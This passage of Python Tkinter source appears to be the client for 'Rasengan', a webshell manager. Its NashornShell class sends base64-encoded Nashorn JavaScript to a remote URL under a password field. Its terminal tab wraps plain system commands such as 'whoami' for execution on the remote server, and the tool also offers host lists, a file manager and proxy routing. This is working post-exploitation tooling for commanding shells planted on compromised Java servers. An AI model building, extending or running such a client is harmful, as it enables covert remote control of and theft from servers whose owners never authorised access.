                    self.file_tab.status_lbl.config(text=f"Saved: {os.path.basename(self.remote_path)}")
                    self.file_tab.refresh()
            else:
                self.header_label.config(text=f"  Save failed: {result[:80]}", fg="#cc0000")
        self.after(0, _done)

    def _sync_lineno(self):
        self.lineno.configure(state=tk.NORMAL)
        self.lineno.delete("1.0", tk.END)
        top = self.text.index("@0,0")
        bot = self.text.index(f"@0,{self.text.winfo_height()}")
        top_ln = int(top.split(".")[0])
        bot_ln = int(bot.split(".")[0])
        for ln in range(top_ln, bot_ln + 1):
            self.lineno.insert(tk.END, f"{ln:>5}\n")
        self.lineno.configure(state=tk.DISABLED)


class TerminalTab(tk.Frame):
    def __init__(self, parent, shell):
        super().__init__(parent, bg="#1e1e1e")
        self.shell = shell
        self.history = []
        self.hist_idx = -1
        self.setup_ui()

    def setup_ui(self):
        # Output
        out_frame = tk.Frame(self, bg="#1e1e1e")
        out_frame.pack(fill=tk.BOTH, expand=True, padx=4, pady=(4, 2))

        self.output = scrolledtext.ScrolledText(out_frame, bg="#0d0d0d", fg="#00ff00",
                                                 insertbackground="#00ff00", font=("Consolas", 11),
                                                 wrap=tk.WORD, relief=tk.FLAT, borderwidth=0)
        self.output.pack(fill=tk.BOTH, expand=True)
        self.output.configure(state=tk.DISABLED)

        # Input row
        in_frame = tk.Frame(self, bg="#1e1e1e")
        in_frame.pack(fill=tk.X, padx=4, pady=(2, 4))

        self.input_box = tk.Text(in_frame, bg="#0d0d0d", fg="#d4d4d4", insertbackground="#d4d4d4",
                                  font=("Consolas", 12), height=4, relief=tk.FLAT, borderwidth=0)
        self.input_box.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        self.input_box.insert("1.0", "// Enter to execute, Shift+Enter for newline")
        self.input_box.configure(fg="#555")
        self.input_box.bind("<FocusIn>", self._clear_placeholder)
        self.input_box.bind("<Return>", self._on_enter)
        self.input_box.bind("<KeyPress-Up>", self._hist_up)
        self.input_box.bind("<KeyPress-Down>", self._hist_down)

        tk.Button(in_frame, text="Send", command=self.execute, bg="#007acc", fg="white",
                 font=("Consolas", 11, "bold"), relief=tk.FLAT, padx=12, pady=2,
                 cursor="hand2", activebackground="#1a8ad4", borderwidth=0,
                 width=6).pack(side=tk.RIGHT, padx=(6, 0), fill=tk.Y)

    def _on_enter(self, event):
        """Enter → execute; Shift+Enter → newline."""
        if event.state & 0x0001:  # Shift pressed
            self.input_box.insert(tk.INSERT, "\n")
            return "break"
        self.execute()
        return "break"

    def _clear_placeholder(self, event):
        if self.input_box.get("1.0", tk.END).strip() == "// Enter to execute, Shift+Enter for newline":
            self.input_box.delete("1.0", tk.END)
            self.input_box.configure(fg="#d4d4d4")

    def _hist_up(self, event):
        if self.history and self.hist_idx > 0:
            self.hist_idx -= 1
            self.input_box.delete("1.0", tk.END)
            self.input_box.insert("1.0", self.history[self.hist_idx])
        return "break"

    def _hist_down(self, event):
        if self.history and self.hist_idx < len(self.history) - 1:
            self.hist_idx += 1
            self.input_box.delete("1.0", tk.END)
            self.input_box.insert("1.0", self.history[self.hist_idx])
        elif self.hist_idx == len(self.history) - 1:
            self.hist_idx = len(self.history)
            self.input_box.delete("1.0", tk.END)
        return "break"

    def execute(self):
        code = self.input_box.get("1.0", tk.END).strip()
        if not code or code == "// Type JS code here, Ctrl+Enter to execute":
            return
        # Substitute helper shortcuts: exec("cmd"), ls("path"), cat("path"), env("key")
        code = self._apply_helpers(code)
        self.history.append(code)
        self.hist_idx = len(self.history)
        self._append(f"\n>>> {code[:200]}{'...' if len(code)>200 else ''}\n", "#569cd6")
        self.input_box.delete("1.0", tk.END)
        threading.Thread(target=self._do_exec, args=(code,), daemon=True).start()

    def _apply_helpers(self, text):
        """Translate CLI-style shortcuts into Nashorn JS.
        Supports: exec("cmd"), ls("path"), cat("path"), env("key"), sysprop("key")
        Plain text like 'whoami' or 'ipconfig' is auto-wrapped as exec()."""
        t = text.strip()

        # 1) Built-in helpers: exec("..."), ls("..."), cat("..."), env("..."), sysprop("...")
        for helper, template in TERM_HELPERS.items():
            prefix = f"{helper}("
            if t.startswith(prefix) and t.endswith(')'):
                arg = t[len(prefix):-1]
                if (arg.startswith('"') and arg.endswith('"')) or \
                   (arg.startswith("'") and arg.endswith("'")):
                    arg = arg[1:-1]
                return template.replace('{}', arg)

        # 2) If it starts with a keyword that looks like JS, pass through
        js_keywords = ('var ', 'if ', 'for ', 'while ', 'function ', 'print(',
                       'java.', '//', '/*', 'new ', 'try ', 'switch ')
        if any(t.startswith(kw) for kw in js_keywords):
            return text

        # 3) Otherwise treat as a system command (auto-wrap in exec)
        return TERM_HELPERS['exec'].replace('{}', t.replace('"', '\\"'))

    def _do_exec(self, code):
        result = self.shell.exec(code)
        if result:
            self._append(result + "\n", "#00ff00")
        else:
            self._append("[empty]\n", "#888")

    def _append(self, text, color):
        def _do():
            self.output.configure(state=tk.NORMAL)
            self.output.insert(tk.END, text, color)
            self.output.tag_config(color, foreground=color)
            self.output.configure(state=tk.DISABLED)
            self.output.see(tk.END)
        self.output.after(0, _do)

    def clear(self):
        self.output.configure(state=tk.NORMAL)
        self.output.delete("1.0", tk.END)
        self.output.configure(state=tk.DISABLED)


class NashornShell:
    """Core shell communication"""
    def __init__(self, url, password, mode="form", proxy=None):
        self.url = url
        self.password = password
        self.mode = mode  # "form" or "raw"
        self.proxy = proxy or {}

    def _build_proxies(self):
        if not self.proxy or not self.proxy.get("enabled") or not self.proxy.get("host"):
            return None
        ptype = self.proxy.get("type", "http")
        host = self.proxy["host"]
        port = self.proxy.get("port", "")
        user = self.proxy.get("username", "")
        pasw = self.proxy.get("password", "")
        auth = f"{user}:{pasw}@" if user and pasw else ""
        port_part = f":{port}" if port else ""
        proxy_url = f"{ptype}://{auth}{host}{port_part}"
        return {"http": proxy_url, "https": proxy_url}

    def exec(self, code):
        try:
            payload = base64.b64encode(code.encode()).decode()
            proxies = self._build_proxies()
            if self.mode == "raw":
                r = requests.post(self.url, data=payload, headers={"Content-Type": "application/octet-stream"}, timeout=30, proxies=proxies)
            else:
                r = requests.post(self.url, data={self.password: payload}, timeout=30, proxies=proxies)
            result = r.text
            # Strip password echo prefix (shell prepends "password\n")
            for prefix in (f"{self.password}\r\n", f"{self.password}\n"):
                if result.startswith(prefix):
                    result = result[len(prefix):]
                    break
            return result.strip()
        except Exception as e:
            return f"[!] {e}"


class App:
    def __init__(self):
        # Fix taskbar icon on Windows
        if IS_WINDOWS:
            ctypes.windll.shell32.SetCurrentProcessExplicitAppUserModelID("Rasengan")
        self.root = tk.Tk()
        self.root.title("Rasengan")
        self.root.iconbitmap(os.path.join(os.path.dirname(os.path.abspath(__file__)), "Rasengan.ico"))
        self.root.geometry("960x680")
        self.root.minsize(800, 500)
        self.root.configure(bg="#1e1e1e")

        self.shell = None
        self.hosts = {}      # {name: {url, password, mode}}
        self.active_name = None
        self.proxy_cfg = {"enabled": False, "type": "http", "host": "", "port": "", "username": "", "password": ""}

        self.load_config()
        self.setup_menu()
        self.setup_status_bar()
        self.setup_tabs()

        if self.active_name and self.active_name in self.hosts:
            self._activate_host(self.active_name)
        elif self.hosts:
            first = list(self.hosts.keys())[0]
            self._activate_host(first)

        self.root.protocol("WM_DELETE_WINDOW", self.on_close)
        self._center_window()
        self.root.mainloop()

    def _center_window(self):
        self.root.update_idletasks()
        w = self.root.winfo_width()
        h = self.root.winfo_height()
        sw = self.root.winfo_screenwidth()
        sh = self.root.winfo_screenheight()
        x = (sw - w) // 2
        y = (sh - h) // 2 - 40
        self.root.geometry(f"+{x}+{y}")

    def load_config(self):
        try:
            with open(CONFIG_FILE) as f:
                cfg = json.load(f)
            # New format with hosts array
            if "hosts" in cfg:
                self.hosts = cfg["hosts"]
                self.active_name = cfg.get("active")
                self.proxy_cfg = cfg.get("proxy", self.proxy_cfg)
            else:
                # Legacy format: migrate to new
                url = cfg.get("url", "")
                pwd = cfg.get("password", "")
                mode = cfg.get("mode", "form")
                if url and pwd:
                    name = self._url_to_name(url)
                    self.hosts = {name: {"url": url, "password": pwd, "mode": mode}}
                    self.active_name = name
        except:
            pass

    def save_config(self):
        cfg = {
            "hosts": self.hosts,
            "active": self.active_name,
            "proxy": self.proxy_cfg,
        }
        with open(CONFIG_FILE, "w") as f:
            json.dump(cfg, f, indent=2)

    def _url_to_name(self, url):
        """Derive a display name from a URL."""
        try:
            from urllib.parse import urlparse
            p = urlparse(url)
            return p.hostname or url
        except:
            return url

    def _apply_proxy(self):
        """Apply current proxy settings to self.shell and all stored hosts."""
        if self.shell:
            self.shell.proxy = self.proxy_cfg

    def setup_menu(self):
        mb = tk.Menu(self.root, bg="#2d2d2d", fg="#ccc", activebackground="#094771", activeforeground="white")
        self.root.config(menu=mb)

        file_menu = tk.Menu(mb, tearoff=0, bg="#2d2d2d", fg="#ccc", activebackground="#094771")
        file_menu.add_command(label="Connection Settings...", command=self.show_config, accelerator="Ctrl+O")
        file_menu.add_separator()
        file_menu.add_command(label="Exit", command=self.on_close)
        mb.add_cascade(label="File", menu=file_menu)

        proxy_menu = tk.Menu(mb, tearoff=0, bg="#2d2d2d", fg="#ccc", activebackground="#094771")
        proxy_menu.add_command(label="Proxy Settings...", command=self.show_proxy)
        mb.add_cascade(label="Proxy", menu=proxy_menu)

        self.root.bind("<Control-o>", lambda e: self.show_config())

    def setup_status_bar(self):
        self.status_frame = tk.Frame(self.root, bg="#007acc", height=30)
        self.status_frame.pack(fill=tk.X)

        self.status_dot = tk.Label(self.status_frame, text="●", bg="#007acc", fg="#888",
                                    font=("Consolas", 12))
        self.status_dot.pack(side=tk.LEFT, padx=8)

        self.detail_label = tk.Label(self.status_frame, text="Not connected", bg="#007acc", fg="white",
                                      font=("Consolas", 10))
        self.detail_label.pack(side=tk.LEFT, padx=(0, 12))

        self.speed_label = tk.Label(self.status_frame, text="", bg="#007acc", fg="#a0d4ff",
                                     font=("Consolas", 9))
        self.speed_label.pack(side=tk.RIGHT, padx=10)

        self.config_btn = tk.Button(self.status_frame, text="⚙ Settings", command=self.show_config,
                                     bg="#005a9e", fg="white", font=("Segoe UI", 9), relief=tk.FLAT,
                                     padx=10, cursor="hand2", activebackground="#004c8c", borderwidth=0)
        self.config_btn.pack(side=tk.RIGHT, padx=6)

    def _activate_host(self, name):
        h = self.hosts[name]
        self.shell = NashornShell(h["url"], h["password"], h.get("mode", "form"), self.proxy_cfg)
        self.active_name = name
        self.save_config()
        self.host_tab.refresh()
        self.connect()

    def set_status(self, text, state="ok"):
        self.detail_label.config(text=text)
        self.status_dot.config(fg=STATUS.get(state, "#888"))

    def setup_tabs(self):
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill=tk.BOTH, expand=True)

        style = ttk.Style()
        style.theme_use("default")
        style.configure("TNotebook", background="#1e1e1e", borderwidth=0)
        style.configure("TNotebook.Tab", background="#2d2d2d", foreground="#ccc",
                       padding=[16, 4], font=("Segoe UI", 10))
        style.map("TNotebook.Tab", background=[("selected", "#1e1e1e")], foreground=[("selected", "white")])

        self.host_tab = HostManagerTab(self.notebook, self)
        self.file_tab = FileManagerTab(self.notebook, self.shell)
        self.term_tab = TerminalTab(self.notebook, self.shell)

        self.notebook.add(self.host_tab, text="  Hosts  ")
        self.notebook.add(self.file_tab, text="  File Manager  ")
        self.notebook.add(self.term_tab, text="  Terminal  ")

    def show_config(self):
        """Edit current host connection settings."""
        current = None
        if self.shell:
            current = {"url": self.shell.url, "password": self.shell.password,
                       "mode": self.shell.mode}
        dlg = ConfigDialog(self.root, current)
        if dlg.result:
            self.shell = NashornShell(dlg.result["url"], dlg.result["password"],
                                      dlg.result.get("mode", "form"), self.proxy_cfg)
            name = self._url_to_name(dlg.result["url"])
            self.hosts[name] = {"url": dlg.result["url"], "password": dlg.result["password"],
                                "mode": dlg.result.get("mode", "form")}
            self.active_name = name
            self.save_config()
            self.host_tab.refresh()
            self.connect()

    def show_proxy(self):
        dlg = ProxyDialog(self.root, self.proxy_cfg)
        if dlg.result is not None:
            self.proxy_cfg = dlg.result
            self._apply_proxy()
            self.save_config()

    def connect(self):
        self.set_status("Connecting...", "busy")
        self.file_tab.shell = self.shell
        self.term_tab.shell = self.shell
        self.detail_label.config(text=f"{self.shell.url}")
        self.host_tab.refresh()
        threading.Thread(target=self._do_connect, daemon=True).start()

    def _do_connect(self):
        t0 = time.time()
        result = self.shell.exec("print('pong')")
        elapsed = (time.time() - t0) * 1000
        if "pong" in result:
            self.status_dot.after(0, lambda: self.set_status(f"Connected [{elapsed:.0f}ms]", "ok"))
            self.speed_label.after(0, lambda: self.speed_label.config(text=f"{elapsed:.0f}ms"))
            self.file_tab.after(50, self.file_tab.populate_drives)
            self.file_tab.after(200, self.file_tab.refresh)
        else:
            self.status_dot.after(0, lambda: self.set_status(f"Failed: {result[:80]}", "err"))

    def on_close(self):
        self.root.destroy()


if __name__ == "__main__":
    App()
